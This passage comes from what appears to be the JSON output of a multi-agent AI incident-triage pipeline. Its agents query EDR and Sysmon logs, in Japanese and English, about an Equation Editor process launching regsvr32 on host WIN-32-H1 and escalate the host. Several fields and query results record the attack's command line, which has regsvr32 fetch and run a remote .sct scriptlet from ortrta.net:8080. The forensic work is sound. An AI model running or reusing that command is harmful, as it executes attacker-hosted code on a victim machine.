\"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"object\",\n          \"value\": \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\AutoDetect\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"access\",\n          \"value\": \"ACTION_WRITE_VALUE\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    }\n  ],\n  \"code_sequence\": [\n    \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n    \"ortrta.net:8080\",\n    \"c:\\\\windows\\\\system32\\\\scrobj.dll\",\n    \"c:\\\\windows\\\\system32\\\\winhttp.dll\",\n    \"c:\\\\users\\\\aalsahee\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\temporary internet files\\\\counters.dat\",\n    \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\UNCAsIntranet\",\n    \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\AutoDetect\"\n  ],\n  \"supporting_alert_evidence\": [\n    {\n      \"alert_id\": null,\n      \"alert_name\": null,\n      \"source_stream\": null,\n      \"why_supporting_only\": \"CBC alert summary は入力条件上 hidden であり、今回の要約は観測済み telemetry のみで構成しているため。\"\n    }\n  ],\n  \"triage_decision\": {\n    \"alert_disposition\": \"not_applicable\",\n    \"host_disposition\": \"escalate_host_investigation\",\n    \"evidence_basis\": [\n      \"regsvr32.exe (pid 6124) が eqnedt32.exe (ppid 6032) から起動され、外部 URL を含む command_line で実行されている。\",\n      \"同一主体で ortrta.net:8080 へのネットワーク接続、scrobj.dll と winhttp.dll のロード、Temporary Internet Files と ZoneMap への書き込みが観測されている。\"\n    ]\n  },\n  \"excluded_nearby_evidence\": [\n    {\n      \"time\": \"2022-07-19 14:33:24\",\n      \"source_stream\": \"cbc-edr\",\n      \"pid\": 6124,\n      \"ppid\": 6032,\n      \"description\": \"regsvr32.exe から直接の child_process は観測されていないため、主chain には追加していない。\"\n    },\n    {\n      \"time\": \"2022-07-19 14:33:24\",\n      \"source_stream\": \"cbc-edr\",\n      \"pid\": 6032,\n      \"ppid\": 648,\n      \"description\": \"EQNEDT32.EXE のさらに上位の起点は今回の主chain に不要なため除外した。\"\n    }\n  ],\n  \"global_limitations\": [\n    \"Stage 3 のため CBC alert summary rows は hidden であり、alert_name / alert_reason は観測できていない。\",\n    \"regsvr32.exe の process path はこの証拠群では未取得。\",\n    \"直接の child_process、DNS 名前解決行、別宛先の追加接続は未確認。\"\n  ],\n  \"timeline_ja\": [\n    \"2022-07-19 14:33:24 に WIN-32-H1 上で regsvr32.exe (pid 6124) が eqnedt32.exe から起動された。\",\n    \"同時刻の command_line に http://ortrta.net:8080/sF5riGj4K26DK.sct が含まれていた。\",\n    \"同一主体で ortrta.net:8080 への接続、scrobj.dll と winhttp.dll のロード、Temporary Internet Files と ZoneMap への操作が続いた。\"\n  ]\n}",
+  "investigation_activity": {
+    "schema_version": "cross_agent_activity_v1",
+    "summary": {
+      "total_tool_call_count": 14,
+      "tool_call_count_by_role": {
+        "chief": 3,
+        "investigator": 3,
+        "sql_qa": 8
+      },
+      "tool_call_count_by_name": {
+        "investigate_lead": 3,
+        "ask_audit": 3,
+        "run_sql_query": 8
+      },
+      "outcome_count": {
+        "success": 6,
+        "sql_no_results": 2,
+        "sql_success": 6
+      },
+      "lead_call_count": 3,
+      "unique_lead_count": 3,
+      "repeated_lead_count": 0,
+      "unique_behavior_key_count": 2,
+      "repeated_behavior_key_count": 1,
+      "investigator_question_count": 3,
+      "unique_investigator_question_count": 3,
+      "repeated_investigator_question_count": 0,
+      "sql_query_count": 8,
+      "unique_sql_query_count": 8,
+      "repeated_sql_query_count": 0,
+      "total_tool_duration_seconds": 69.266,
+      "max_tool_duration_seconds": 29.828
+    },
+    "events": [
+      {
+        "sequence": 1,
+        "role": "chief",
+        "tool_name": "investigate_lead",
+        "arguments": {
+          "lead": "WIN-32-H1 の 2022-07-19 14:31:00 前後に観測された regsvr32.exe の実行について、直前の parent process、command line、起動対象、そして直後に続く child process/対象操作の接続証拠を確認したい。理由は、この時刻の regsvr32.exe が後続のコード行動列の起点である可能性があり、単独のプロセス起動ではなく、実際にどのオブジェクトやコマンドで動いたかを観測ログから復元する必要があるため。確認したい証拠は、parent_process_name / parent_process_path / parent_command_line、regsvr32.exe 自身の command_line、PID/PPID、process_guid、timestamp、そして immediate child または object access があればその接続関係。",
+          "behavior_key": "regsvr32.exe|process execution|regsvr32.exe",
+          "materiality": "missing_component",
+          "evidence_anchor": "regsvr32.exe@2022-07-19 14:31:00"
+        },
+        "started_at_utc": "2026-08-05T06:03:04.798501+00:00",
+        "finished_at_utc": "2026-08-05T06:03:34.627939+00:00",
+        "duration_seconds": 29.828,
+        "outcome": "success",
+        "result_length_chars": 2741,
+        "result_preview": "### 仮説\n2022-07-19 14:33:24 前後の `regsvr32.exe` は、`eqnedt32.exe` から起動され、その後に HTTP 関連の読み込みとローカル対象操作を行っている可能性があります。  \nただし、観測できた範囲では `regsvr32.exe` の直接子プロセスは確認できていません。\n\n### 質問\n1. `pid 6124` の `regsvr32.exe` について、**直後の子プロセス有無** と **HTTP/ネットワーク関連の対象操作** を、観測行で確認できるか。  \n2. `pid 6032` の `EQNEDT32.EXE` について、**親が `svchost.exe` である起動連鎖** が確認できるか。  \n\n### 結果要約\n**観測事実**\n- `regsvr32.exe` の代表行:\n  - `time`: `2022-07-19 14:33:24`\n  - `pid`: `6124`\n  - `ppid`: `6032`\n  - `parent_process_name`: `eqnedt32.exe`\n  - `p",
+        "error": null
+      },
+      {
+        "sequence": 2,
+        "role": "investigator",
+        "tool_name": "ask_audit",
+        "arguments": {
+          "question": "WIN-32-H1 で 2022-07-19 14:31:00 前後に観測された regsvr32.exe について、PID/PPID、process_guid、parent_process_name、parent_process_path、parent_command_line、regsvr32.exe 自身の command_line と timestamp が確認できる代表的な行を見せてください。あわせて、この regsvr32.exe の直後に続く immediate child process、または object access / file / registry / network などの対象操作があれば、その接続が分かる最小限の行も提示してください。"
+        },
+        "started_at_utc": "2026-08-05T06:03:06.265455+00:00",
+        "finished_at_utc": "2026-08-05T06:03:17.291487+00:00",
+        "duration_seconds": 11.031,
+        "outcome": "success",
+        "result_length_chars": 1932,
+        "result_preview": "WIN-32-H1 で 2022-07-19 14:31:00 前後に観測された `regsvr32.exe` について、代表的な行と、その直後に続く対象操作の最小限の行を示します。\n\n### 代表的な `regsvr32.exe` の行\n| time | pid | ppid | process_guid | parent_process_name | parent_process_path | parent_command_line | command_line |\n|---|---:|---:|---|---|---|---|---|\n| 2022-07-19 14:33:24 | 6124 | 6032 | None | eqnedt32.exe | c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe | `\"C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\" -Embedding | regsvr32 /",
+        "error": null
+      },
+      {
+        "sequence": 3,
+        "role": "sql_qa",
+        "tool_name": "run_sql_query",
+        "arguments": {
+          "query": "SELECT time, pid, ppid, process_guid, parent_process_name, parent_process_path, parent_command_line, command_line, access, object, event_id, event_record_id, source_stream, original_table, raw_event_type, childproc_name, filemod_name, regmod_name, netconn_domain, remote_ip, remote_port\nFROM audit_logs\nWHERE source_stream = 'WIN-32-H1'\n  AND time BETWEEN '2022-07-19 14:30:30' AND '2022-07-19 14:31:30'\n  AND process_name LIKE '%regsvr32.exe%'\nORDER BY time, event_record_id\nLIMIT 20;"
+        },
+        "started_at_utc": "2026-08-05T06:03:07.953699+00:00",
+        "finished_at_utc": "2026-08-05T06:03:07.960732+00:00",
+        "duration_seconds": 0.0,
+        "outcome": "sql_no_results",
+        "result_length_chars": 17,
+        "result_preview": "No results found.",
+        "error": null
+      },
+      {
+        "sequence": 4,
+        "role": "sql_qa",
+        "tool_name": "run_sql_query",
+        "arguments": {
+          "query": "SELECT time, pid, ppid, process_name, pname, process_guid, parent_process_name, parent_process_path, parent_command_line, command_line, access, object, event_id, event_record_id, source_stream, original_table, raw_event_type, childproc_name, filemod_name, regmod_name, netconn_domain, remote_ip, remote_port\nFROM audit_logs\nWHERE time BETWEEN '2022-07-19 14:30:30' AND '2022-07-19 14:31:30'\n  AND (process_name LIKE '%regsvr32.exe%' OR pname LIKE '%regsvr32.exe%' OR command_line LIKE '%regsvr32.exe%')\nORDER BY time, event_record_id\nLIMIT 20;"
+        },
+        "started_at_utc": "2026-08-05T06:03:09.653440+00:00",
+        "finished_at_utc": "2026-08-05T06:03:09.659436+00:00",
+        "duration_seconds": 0.0,
+        "outcome": "sql_no_results",
+        "result_length_chars": 17,
+        "result_preview": "No results found.",
+        "error": null
+      },
+      {
+        "sequence": 5,
+        "role": "sql_qa",
+        "tool_name": "run_sql_query",
+        "arguments": {
+          "query": "SELECT time, pid, ppid, process_name, pname, process_guid, parent_process_name, parent_process_path, parent_command_line, command_line, access, object, event_id, event_record_id, source_stream, original_table, raw_event_type, childproc_name, filemod_name, regmod_name, netconn_domain, remote_ip, remote_port\nFROM audit_logs\nWHERE time BETWEEN '2022-07-19 14:25:00' AND '2022-07-19 14:37:00'\n  AND (process_name LIKE '%regsvr32.exe%' OR pname LIKE '%regsvr32.exe%' OR command_line LIKE '%regsvr32.exe%')\nORDER BY time, event_record_id\nLIMIT 20;"
+        },
+        "started_at_utc": "2026-08-05T06:03:11.169786+00:00",
+        "finished_at_utc": "2026-08-05T06:03:11.271315+00:00",
+        "duration_seconds": 0.094,
+        "outcome": "sql_success",
+        "result_length_chars": 14695,
+        "result_preview": "2022-07-19 14:33:24\t6124\t6032\tc:\\windows\\system32\\regsvr32.exe\tregsvr32.exe\tNone\teqnedt32.exe\tc:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe\t\"C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\" -Embedding\tregsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\tACTION_LOAD_MODULE\tc:\\windows\\winsxs\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\\comctl32.dll | event_type=endpoint.event.moduleload |",
+        "error": null
+      },
+      {
+        "sequence": 6,
+        "role": "sql_qa",
+        "tool_name": "run_sql_query",
+        "arguments": {
+          "query": "SELECT time, pid, ppid, process_name, pname, process_guid, parent_process_name, parent_process_path, parent_command_line, command_line, access, object, event_id, event_record_id, source_stream, original_table, raw_event_type, childproc_name, filemod_name, regmod_name, netconn_domain, remote_ip, remote_port\nFROM audit_logs\nWHERE pid = 6124\n  AND time BETWEEN '2022-07-19 14:33:00' AND '2022-07-19 14:34:30'\nORDER BY time, event_record_id\nLIMIT 30;"
+        },
+        "started_at_utc": "2026-08-05T06:03:12.715482+00:00",
+        "finished_at_utc": "2026-08-05T06:03:12.724009+00:00",
+        "duration_seconds": 0.0,
+        "outcome": "sql_success",
+        "result_length_chars": 22868,
+        "result_preview": "2022-07-19 14:33:24\t6124\t6032\tc:\\windows\\system32\\regsvr32.exe\tregsvr32.exe\tNone\teqnedt32.exe\tc:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe\t\"C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\" -Embedding\tregsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\tACTION_LOAD_MODULE\tc:\\windows\\winsxs\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\\comctl32.dll | event_type=endpoint.event.moduleload |",
+        "error": null
+      },
+      {
+        "sequence": 7,
+        "role": "investigator",
+        "tool_name": "ask_audit",
+        "arguments": {
+          "question": "WIN-32-H1 の 2022-07-19 14:33:24 前後で、pid 6124 の regsvr32.exe から直接生じた子プロセスがあるか、または同時刻付近に pid 6124 が行ったネットワーク接続や HTTP 関連の対象操作があるかを、代表的な行だけで示してください。あわせて、親プロセス eqnedt32.exe の pid 6032 に対して、直前にどのプロセスがその親として接続しているかが見える最小限の行もください。"
+        },
+        "started_at_utc": "2026-08-05T06:03:19.676439+00:00",
+        "finished_at_utc": "2026-08-05T06:03:26.541561+00:00",
+        "duration_seconds": 6.875,
+        "outcome": "success",
+        "result_length_chars": 919,
+        "result_preview": "観測できた代表行だけを示すと、以下のとおりです。\n\n### pid 6124 の regsvr32.exe について\n- **直接の子プロセスは、この時刻前後の代表行では見えていません。**\n- ただし、**同時刻 2022-07-19 14:33:24** に、pid 6124 の `regsvr32.exe` が以下を行っています。\n  - `ACTION_LOAD_MODULE` で `winhttp.dll` を読み込み\n  - `ACTION_FILE_MOD_OPEN | ACTION_FILE_OPEN_READ | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES` で  \n    `c:\\users\\aalsahee\\appdata\\local\\microsoft\\windows\\temporary internet files\\counters.dat` を操作\n  - `ACTION_WRITE_VALUE` で `HKU\\...\\Internet Settings\\ZoneMap\\UNCAsIntr",
+        "error": null
+      },
+      {
+        "sequence": 8,
+        "role": "sql_qa",
+        "tool_name": "run_sql_query",
+        "arguments": {
+          "query": "SELECT time, pid, ppid, pname, process_name, access, object, parent_process_name, parent_process_path, parent_command_line, command_line, netconn_domain, remote_ip, remote_port, original_table, source_row_id\nFROM audit_logs\nWHERE time BETWEEN '2022-07-19 14:33:00' AND '2022-07-19 14:33:50'\n  AND (\n    (pid = 6124 AND (\n      access IN ('connect','http','request','read','write','execute')\n      OR object LIKE '%http%'\n      OR object LIKE '%://%'\n      OR object LIKE '%\\%'\n      OR netconn_domain IS NOT NULL\n      OR remote_ip IS NOT NULL\n    ))\n    OR (ppid = 6124 AND process_name IS NOT NULL)\n  )\nORDER BY time, event_record_id\nLIMIT 30;"
+        },
+        "started_at_utc": "2026-08-05T06:03:23.525819+00:00",
+        "finished_at_utc": "2026-08-05T06:03:23.528819+00:00",
+        "duration_seconds": 0.0,
+        "outcome": "sql_success",
+        "result_length_chars": 20775,
+        "result_preview": "2022-07-19 14:33:24\t6124\t6032\tregsvr32.exe\tc:\\windows\\system32\\regsvr32.exe\tACTION_LOAD_MODULE\tc:\\windows\\winsxs\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\\comctl32.dll | event_type=endpoint.event.moduleload | parent_path=c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe | parent_cmdline=\"C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\" -Embedding | modload_name=c:\\windows\\winsxs\\x86_microsoft.windows.common",
+        "error": null
+      },
+      {
+        "sequence": 9,
+        "role": "sql_qa",
+        "tool_name": "run_sql_query",
+        "arguments": {
+          "query": "SELECT time, pid, ppid, pname, process_name, parent_process_name, parent_process_path, parent_command_line, command_line, access, object, original_table, source_row_id\nFROM audit_logs\nWHERE time <= '2022-07-19 14:33:24'\n  AND pid = 6032\n  AND (\n    parent_process_name IS NOT NULL\n    OR parent_process_path IS NOT NULL\n    OR parent_command_line IS NOT NULL\n    OR ppid IS NOT NULL\n  )\nORDER BY time DESC, event_record_id DESC\nLIMIT 5;"
+        },
+        "started_at_utc": "2026-08-05T06:03:23.530327+00:00",
+        "finished_at_utc": "2026-08-05T06:03:23.643690+00:00",
+        "duration_seconds": 0.11,
+        "outcome": "sql_success",
+        "result_length_chars": 2716,
+        "result_preview": "2022-07-19 14:33:24\t6032\t648\tEQNEDT32.EXE\tC:\\Program Files\\Common Files\\microsoft shared\\EQUATION\\EQNEDT32.EXE\t-\t-\t-\t\"C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\" -Embedding\tprocess_create\t\"C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\" -Embedding\tsysmon_logs\t4166\n2022-07-19 14:33:24\t6032\t648\teqnedt32.exe\tc:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe\tsvchost.exe\tc:\\windows\\system32\\svchost.exe\tC:\\Windows\\system32\\svchost.exe ",
+        "error": null
+      },
+      {
+        "sequence": 10,
+        "role": "chief",
+        "tool_name": "investigate_lead",
+        "arguments": {
+          "lead": "WIN-32-H1 の 2022-07-19 14:33:24 前後の regsvr32.exe について、同一 PID 内で続く対象操作のうち、外部 URL を伴う command line と scrobj.dll / winhttp.dll ロード、Temporary Internet Files と ZoneMap への操作がどの順序で現れるかを確認したい。理由は、起点の regsvr32.exe が単なる起動ではなく、どのオブジェクト操作を伴って実行されたかの順序証拠を固めるため。確認したい証拠は、command_line、process_guid、timestamp、target object、parent-child の直後関係。",
+          "behavior_key": "regsvr32.exe|process execution|regsvr32.exe",
+          "materiality": "order_resolution",
+          "evidence_anchor": "regsvr32.exe@2022-07-19 14:31:00"
+        },
+        "started_at_utc": "2026-08-05T06:03:38.296400+00:00",
+        "finished_at_utc": "2026-08-05T06:03:38.298403+00:00",
+        "duration_seconds": 0.0,
+        "outcome": "success",
+        "result_length_chars": 153,
+        "result_preview": "behavior_key_guard: duplicate candidate step rejected. Use the existing investigation result and do not restate individual component fields as new leads.",
+        "error": null
+      },
+      {
+        "sequence": 11,
+        "role": "chief",
+        "tool_name": "investigate_lead",
+        "arguments": {
+          "lead": "WIN-32-H1 の 2022-07-19 14:31:00 から 14:36:00 にかけて、regsvr32.exe の後続でネットワーク接続または外部ホスト参照を示す観測行があるかを確認したい。理由は、URL を含む command line が実際の通信または名前解決と結びつくかを、同一主体の観測で確かめるため。確認したい証拠は、netconn_domain、remote_ip、remote_port、source_stream、timestamp、同一 PID/ process_guid による接続関係。",
+          "behavior_key": "regsvr32.exe|network connection|ortrta.net:8080",
+          "materiality": "missing_component",
+          "evidence_anchor": "regsvr32.exe@2022-07-19 14:31:00"
+        },
+        "started_at_utc": "2026-08-05T06:03:38.299400+00:00",
+        "finished_at_utc": "2026-08-05T06:03:52.388606+00:00",
+        "duration_seconds": 14.094,
+        "outcome": "success",
+        "result_length_chars": 1522,
+        "result_preview": "### 仮説\nWIN-32-H1 上で `regsvr32.exe` は、指定された時間帯に外部ホスト `ortrta.net` を含むコマンドラインで起動され、その主体に関連する外部参照/通信が観測されている可能性があります。  \nただし、現時点では **名前解決そのものは未確認** で、確認できたのはネットワーク接続/外部ホスト参照です。\n\n### 質問\n`2022-07-19 14:31:00` 〜 `14:36:00` の間で、`regsvr32.exe` と同一 PID または同一 process_guid に紐づく後続のネットワーク接続、外部ホスト参照、または名前解決を示す観測行はありますか。  \nあれば、`timestamp`、`pid`、`ppid`、`pname`、`process_name`、`command_line`、`source_stream`、`netconn_domain`、`remote_ip`、`remote_port`、`process_guid`、`parent_process_guid` が分かる代表的な raw row を示してください。\n\n",
+        "error": null
+      },
+      {
+        "sequence": 12,
+        "role": "investigator",
+        "tool_name": "ask_audit",
+        "arguments": {
+          "question": "WIN-32-H1 の 2022-07-19 14:31:00 から 14:36:00 の間で、regsvr32.exe と同一 PID または同一 process_guid に紐づく後続のネットワーク接続、外部ホスト参照、または名前解決を示す観測行はありますか。あれば代表的な raw rows を、timestamp、pid、ppid、pname、process_name、command_line、source_stream、netconn_domain、remote_ip、remote_port、process_guid、parent_process_guid が分かる形で示してください。"
+        },
+        "started_at_utc": "2026-08-05T06:03:40.742929+00:00",
+        "finished_at_utc": "2026-08-05T06:03:47.768206+00:00",
+        "duration_seconds": 7.031,
+        "outcome": "success",
+        "result_length_chars": 967,
+        "result_preview": "はい、あります。\n\n対象期間 `2022-07-19 14:31:00` 〜 `14:36:00` で、`regsvr32.exe` に紐づく後続のネットワーク接続・外部ホスト参照を示す観測行として、少なくとも 1 件確認できました。  \nただし、提示された条件に対しては **名前解決（DNS）そのものを直接示す行はこの検索では確認できず**、確認できたのは `cbc-edr` 由来のネットワーク接続/外部ホスト参照です。\n\n代表的な raw row は以下です。\n\n| timestamp | pid | ppid | pname | process_name | command_line | source_stream | netconn_domain | remote_ip | remote_port | process_guid | parent_process_guid |\n|---|---:|---:|---|---|---|---|---|---|---:|---|---|\n| 2022-07-19 14:33:24 | 6124 | 6032 | regsvr32.exe",
+        "error": null
+      },
+      {
+        "sequence": 13,
+        "role": "sql_qa",
+        "tool_name": "run_sql_query",
+        "arguments": {
+          "query": "SELECT time, pid, ppid, pname, process_name, command_line, source_stream, netconn_domain, remote_ip, remote_port, process_guid, parent_process_guid\nFROM audit_logs\nWHERE time BETWEEN '2022-07-19 14:31:00' AND '2022-07-19 14:36:00'\n  AND (\n    (process_name LIKE '%regsvr32.exe%' OR pname LIKE '%regsvr32.exe%' OR command_line LIKE '%regsvr32.exe%')\n    AND (access = 'connect' OR netconn_domain IS NOT NULL OR remote_ip IS NOT NULL OR source_stream LIKE '%dns%' OR source_stream LIKE '%browser%')\n  )\nORDER BY time, pid\nLIMIT 30;"
+        },
+        "started_at_utc": "2026-08-05T06:03:42.528728+00:00",
+        "finished_at_utc": "2026-08-05T06:03:42.556242+00:00",
+        "duration_seconds": 0.016,
+        "outcome": "sql_success",
+        "result_length_chars": 196,
+        "result_preview": "2022-07-19 14:33:24\t6124\t6032\tregsvr32.exe\tc:\\windows\\system32\\regsvr32.exe\tregsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\tcbc-edr\tortrta.net\t10.193.66.115\t8080\tNone\tNone",
+        "error": null
+      },
+      {
+        "sequence": 14,
+        "role": "sql_qa",
+        "tool_name": "run_sql_query",
+        "arguments": {
+          "query": "SELECT time, pid, ppid, pname, process_name, command_line, source_stream, netconn_domain, remote_ip, remote_port, process_guid, parent_process_guid\nFROM audit_logs\nWHERE time BETWEEN '2022-07-19 14:31:00' AND '2022-07-19 14:36:00'\n  AND (\n    pid = 6124 OR process_guid IS NULL\n  )\n  AND (\n    access = 'connect'\n    OR netconn_domain IS NOT NULL\n    OR remote_ip IS NOT NULL\n    OR source_stream LIKE '%dns%'\n    OR source_stream LIKE '%browser%'\n  )\nORDER BY time, source_stream, remote_ip, netconn_domain\nLIMIT 30;"
+        },
+        "started_at_utc": "2026-08-05T06:03:44.356352+00:00",
+        "finished_at_utc": "2026-08-05T06:03:44.551917+00:00",
+        "duration_seconds": 0.187,
+        "outcome": "sql_success",
+        "result_length_chars": 5379,
+        "result_preview": "2022-07-19 14:31:06\t2508\t1604\tfirefox.exe\tc:\\program files\\mozilla firefox\\firefox.exe\t\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" \tcbc-edr\tocsp.comodoca.com.cdn.cloudflare.net\t172.64.155.188\t80\tNone\tNone\n2022-07-19 14:31:06\t2508\t1604\tfirefox.exe\tc:\\program files\\mozilla firefox\\firefox.exe\t\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" \tcbc-edr\tocsp.sectigo.com\t172.64.155.188\t80\tNone\tNone\n2022-07-19 14:31:07\t844\t484\tsvchost.exe\tc:\\windows\\system32\\svchost.exe\tC:\\Windows\\System32\\svchost.exe ",
+        "error": null
+      }
+    ]
+  },
+  "lead_expansion_guard": {
+    "config": {
+      "enabled": true,
+      "max_investigator_questions_per_lead": 20,
+      "max_sql_tool_calls_per_question": 12,
+      "max_sql_tool_calls_per_lead": 80,
+      "max_wall_seconds_per_lead": 1200.0,
+      "on_trigger": "summarize_collected_evidence_and_return_unresolved_frontier_to_chief"
+    },
+    "records": [
+      {
+        "lead": "WIN-32-H1 の 2022-07-19 14:31:00 前後に観測された regsvr32.exe の実行について、直前の parent process、command line、起動対象、そして直後に続く child process/対象操作の接続証拠を確認したい。理由は、この時刻の regsvr32.exe が後続のコード行動列の起点である可能性があり、単独のプロセス起動ではなく、実際にどのオブジェクトやコマンドで動いたかを観測ログから復元する必要があるため。確認したい証拠は、parent_process_name / parent_process_path / parent_command_line、regsvr32.exe 自身の command_line、PID/PPID、process_guid、timestamp、そして immediate child または object access があればその接続関係。",
+        "investigator_question_count": 2,
+        "sql_tool_call_count": 6,
+        "empty_tool_result_count": 0,
+        "consecutive_empty_tool_result_count": 0,
+        "duration_seconds": 29.828,
+        "triggered": false,
+        "stop_reason": null
+      },
+      {
+        "lead": "WIN-32-H1 の 2022-07-19 14:31:00 から 14:36:00 にかけて、regsvr32.exe の後続でネットワーク接続または外部ホスト参照を示す観測行があるかを確認したい。理由は、URL を含む command line が実際の通信または名前解決と結びつくかを、同一主体の観測で確かめるため。確認したい証拠は、netconn_domain、remote_ip、remote_port、source_stream、timestamp、同一 PID/ process_guid による接続関係。",
+        "investigator_question_count": 1,
+        "sql_tool_call_count": 2,
+        "empty_tool_result_count": 0,
+        "consecutive_empty_tool_result_count": 0,
+        "duration_seconds": 14.094,
+        "triggered": false,
+        "stop_reason": null
+      }
+    ],
+    "trigger_count": 0
+  },
+  "empty_tool_result_guard": {
+    "config": {
+      "enabled": true,
+      "max_consecutive_empty_results_per_lead": 2,
+      "on_first_empty": "retry_same_bounded_question_once",
+      "on_limit": "fail_run_closed"
+    },
+    "records": [],
+    "trigger_count": 0,
+    "fail_closed_count": 0
+  },
+  "tool_validation_recovery": {
+    "config": {
+      "enabled": true,
+      "scope": "pydantic_tool_argument_validation_only",
+      "action": "return_tool_message_and_reprompt_same_agent",
+      "valid_tool_call_limits_affected": false,
+      "execution_exceptions_recovered": false
+    },
+    "records": [],
+    "recovered_count": 0
+  },
+  "behavior_key_guard": {
+    "config": {
+      "enabled": true,
+      "key_schema": "subject|operation|object",
+      "policy": "semantic_fingerprint_atomic_guard_v15",
+      "evidence_anchor_required": true,
+      "allowed_evidence_anchors": [
+        "regsvr32.exe@2022-07-19 14:31:00"
+      ],
+      "concrete_subject_object_required_for": [
+        "new_step",
+        "order_resolution"
+      ],
+      "component_only_operations_rejected": true,
+      "component_only_subject_object_labels_rejected": true,
+      "process_start_semantic_fingerprint_deduplication": true,
+      "temporal_behavior_key_qualifiers_rejected": true,
+      "component_relation_terms_rejected": true,
+      "explicit_placeholder_values_rejected": true,
+      "explicit_placeholder_rejection_scope": "all_materialities",
+      "materiality_values": [
+        "new_step",
+        "order_resolution",
+        "missing_component"
+      ]
+    },
+    "records": [
+      {
+        "behavior_key": "regsvr32.exe|process execution|regsvr32.exe",
+        "normalized_behavior_key": "regsvr32.exe|process execution|regsvr32.exe",
+        "materiality": "missing_component",
+        "evidence_anchor": "regsvr32.exe@2022-07-19 14:31:00",
+        "context_free_behavior_key": "regsvr32.exe|process execution|regsvr32.exe",
+        "semantic_fingerprint": "regsvr32.exe|process_execution|regsvr32.exe",
+        "status": "accepted"
+      },
+      {
+        "behavior_key": "regsvr32.exe|process execution|regsvr32.exe",
+        "normalized_behavior_key": "regsvr32.exe|process execution|regsvr32.exe",
+        "materiality": "order_resolution",
+        "evidence_anchor": "regsvr32.exe@2022-07-19 14:31:00",
+        "context_free_behavior_key": "regsvr32.exe|process execution|regsvr32.exe",
+        "semantic_fingerprint": "regsvr32.exe|process_execution|regsvr32.exe",
+        "status": "rejected_duplicate_key"
+      },
+      {
+        "behavior_key": "regsvr32.exe|network connection|ortrta.net:8080",
+        "normalized_behavior_key": "regsvr32.exe|network connection|ortrta.net:8080",
+        "materiality": "missing_component",
+        "evidence_anchor": "regsvr32.exe@2022-07-19 14:31:00",
+        "context_free_behavior_key": "regsvr32.exe|network connection|ortrta.net:8080",
+        "semantic_fingerprint": "regsvr32.exe|network_connection|ortrta.net:8080",
+        "status": "accepted"
+      }
+    ],
+    "accepted_key_count": 2,
+    "rejected_key_count": 1
+  },
+  "run_budget_guard": {
+    "config": {
+      "enabled": false,
+      "soft_api_calls": 350,
+      "hard_api_calls": 400,
+      "soft_total_tokens": 1600000,
+      "hard_total_tokens": 2000000,
+      "soft_cost_usd": 6.0,
+      "hard_cost_usd": 8.0,
+      "soft_chief_leads": 20,
+      "hard_chief_leads": 24,
+      "on_soft_trigger": "stop_new_expansion_and_finalize_with_unresolved_frontier",
+      "on_hard_trigger": "stop_new_model_calls_and_mark_budget_censored",
+      "formal_scoring_policy": "exclude_budget_censored_run_until_separate_review"
+    },
+    "enabled": false,
+    "api_calls": 0,
+    "usage": {
+      "input_tokens": 0,
+      "output_tokens": 0,
+      "cached_input_tokens": 0,
+      "total_tokens": 0
+    },
+    "estimated_cost_usd": 0.0,
+    "chief_leads_started": 0,
+    "chief_leads_completed": 0,
+    "active_chief_leads": 0,
+    "role_call_counts": {},
+    "soft_triggered": false,
+    "hard_triggered": false,
+    "soft_stop_reason": null,
+    "hard_stop_reason": null,
+    "budget_limited": false,
+    "budget_censored": false,
+    "events": []
+  },
+  "usage": {
+    "input_tokens": 92460,
+    "output_tokens": 12763,
+    "cached_input_tokens": 46080,
+    "total_tokens": 105223
+  },
+  "usage_scope": "full_pipeline_callback_v1",
+  "usage_breakdown": {
+    "chief": {
+      "input_tokens": 27104,
